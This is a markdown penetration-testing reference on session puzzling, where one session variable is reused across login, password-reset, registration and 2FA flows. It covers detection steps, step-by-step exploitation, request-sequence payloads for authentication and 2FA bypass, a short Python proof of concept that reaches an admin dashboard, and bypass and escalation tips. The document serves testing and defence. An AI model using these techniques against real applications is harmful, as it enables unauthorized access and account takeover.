# Session Puzzling

> **Summary**: Session puzzling (also called session variable overloading) occurs when an application uses the same session variable for multiple purposes across different flows, allowing an attacker to manipulate one flow to influence another.
> **Impact**: Authentication bypass, privilege escalation, access control circumvention, account takeover.
> **Typical Severity**: High

## Detection

### Indicators
- Same session variable name used in different application flows (e.g., login, password reset, registration)
- Session state is checked without verifying which flow populated it
- Application allows unauthenticated access to flows that set session variables also used in authenticated contexts
- Multi-step workflows that store intermediate state in session variables

### Automated Detection
- Map all endpoints that read/write session variables using a proxy (Burp Suite session tracking)
- Use Burp Logger or custom extensions to track session variable assignments across flows
- Compare session cookies before and after interacting with different features

### Manual Detection
1. Identify endpoints that set session variables (login, registration, password reset, 2FA, etc.)
2. Complete one flow partially (e.g., start password reset but do not finish)
3. Navigate to a different feature that reads the same session variable (e.g., admin dashboard)
4. Check if the session state from flow A grants access in flow B

## Exploitation

### Prerequisites
- The application reuses the same session variable across different logical flows
- At least one flow that sets the variable is accessible without full authentication
- The application checks the session variable but not the context in which it was set

### Step-by-Step

1. **Map session-dependent flows**: Identify all endpoints that create or modify session state. Focus on:
   - Login / authentication
   - Password reset
   - Registration / email verification
   - 2FA / MFA verification
   - Profile update
   - Admin workflows

   **Success**: You have a list of endpoints and the session variables they read/write.

2. **Identify shared session variables**: Look for variables that are set in one flow and checked in another. Common examples:
   - `session['user']` set during registration and checked in admin panel
   - `session['authenticated']` set during password reset and checked at login
   - `session['role']` or `session['is_admin']` set via a public flow

   **Success**: You find at least one variable used in two different contexts.

3. **Trigger the variable via the weaker flow**: Complete the flow that sets the target session variable without requiring full authentication. For example:
   - Start a password reset for an admin account (sets `session['user'] = 'admin'`)
   - Register a new account (sets `session['authenticated'] = true`)
   - Complete a partial login step (sets `session['user_id']`)

   **Success**: The session variable is now populated with a controlled value.

4. **Access the protected feature**: Navigate to the endpoint that reads the session variable, expecting it to have been set by the proper (authenticated) flow:
   ```
   GET /admin/dashboard HTTP/1.1
   Cookie: PHPSESSID=<SESSION_FROM_STEP_3>
   ```

   **Success**: You gain access to the protected feature without completing the required authentication flow.

5. **Escalate**: Use the bypassed access to perform privileged actions, extract data, or chain with other vulnerabilities.

### Payloads

#### Password Reset to Authentication Bypass
```
1. POST /forgot-password  (body: email=admin@target.com)
   -> Server sets session['user'] = 'admin'
2. GET /admin/dashboard
   -> Server checks session['user'] exists -> grants access
```

#### Registration Flow to Admin Access
```
1. POST /register  (body: username=admin&email=attacker@evil.com)
   -> Server sets session['username'] = 'admin' (name already taken, but session set before validation)
2. GET /profile/edit
   -> Server uses session['username'] to load profile -> loads admin profile
```

#### 2FA Bypass via Session Overloading
```
1. POST /login  (body: user=admin&pass=admin_password)
   -> Server sets session['pending_2fa'] = true, session['user_id'] = 1
2. POST /login  (body: user=attacker&pass=attacker_password)  [attacker has no 2FA]
   -> Server sets session['authenticated'] = true but session['user_id'] still = 1
3. GET /dashboard
   -> Logged in as admin (user_id=1) without completing 2FA
```

#### Cancellation / Incomplete Flow Abuse
```
1. Start a sensitive workflow that sets session variables
2. Cancel or navigate away before completion
3. Session variables remain set
4. Access a different feature that relies on those variables
```

### Proof of Concept

```python
import requests

target = "http://<TARGET>"
s = requests.Session()

# Step 1: Trigger password reset for admin (sets session['user'] = 'admin')
s.post(f"{target}/forgot-password", data={"email": "admin@target.com"})

# Step 2: Access admin panel using the same session
r = s.get(f"{target}/admin/dashboard")
if "Admin Dashboard" in r.text:
    print("[+] Session puzzling successful - admin access gained")
else:
    print("[-] Session variable not reused or flow differs")
```

## Bypasses

- If the application clears session variables after flow completion, try aborting the flow mid-way
- If session is regenerated on login, check if password reset or registration preserves the old session
- Try interleaving steps from different flows in unexpected orders
- Race condition: trigger two flows simultaneously that both write to the same variable

## Escalation

- **Authentication bypass to account takeover**: Access admin features, change passwords, exfiltrate data
- **Privilege escalation**: Set admin role via a public flow, then access privileged endpoints
- Chain with [Account Takeover](account-takeover.md) techniques
- Chain with [Cookie-Based Attacks](cookie-based-attacks.md) for session manipulation
